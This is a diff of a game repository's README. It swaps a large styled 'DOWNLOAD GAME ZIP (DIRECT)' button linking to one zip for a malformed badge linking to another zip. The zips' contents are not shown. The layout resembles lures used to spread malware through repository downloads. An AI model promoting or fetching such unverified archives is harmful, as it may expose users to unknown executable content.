@@ -1,8 +1,5 @@
-<p align="center">
-  <a href="https://github.com/DivanshLpu/indie-game/blob/a5e2ff9b20dd0ece0c4aa317e34fa43e657135c4/release1-source.zip" style="display: inline-block; padding: 16px 40px; font-size: 20px; font-weight: 800; text-align: center; text-decoration: none; color: #ffffff; background-color: #238636; border-radius: 50px; box-shadow: 0px 4px 15px rgba(35, 134, 54, 0.4); transform: scale(1); transition: all 0.2s ease;">
-    🚀 DOWNLOAD GAME ZIP (DIRECT)
-  </a>
-</p>
+[![Explore Now]([https://shields.io](https://img.shields.io/badge/DOWNLOAD-brightgreen?style=for-the-badge))](https://github.com/DivanshLpu/indie-game/blob/main/release2.zip)
+
 
 
 # 🎮 Indie Game Dev
